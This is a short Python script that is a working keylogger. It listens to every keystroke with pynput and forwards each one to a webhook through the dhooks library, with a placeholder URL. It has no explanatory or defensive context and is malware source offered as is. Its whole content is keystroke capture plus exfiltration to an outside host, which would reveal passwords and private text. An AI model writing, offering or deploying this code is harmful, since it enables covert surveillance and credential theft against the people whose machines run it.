from dhooks import Webhook
from pynput.keyboard import Key, Listener

hook = Webhook("Webhook-URL")
def on_press(key):
    hook.send(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
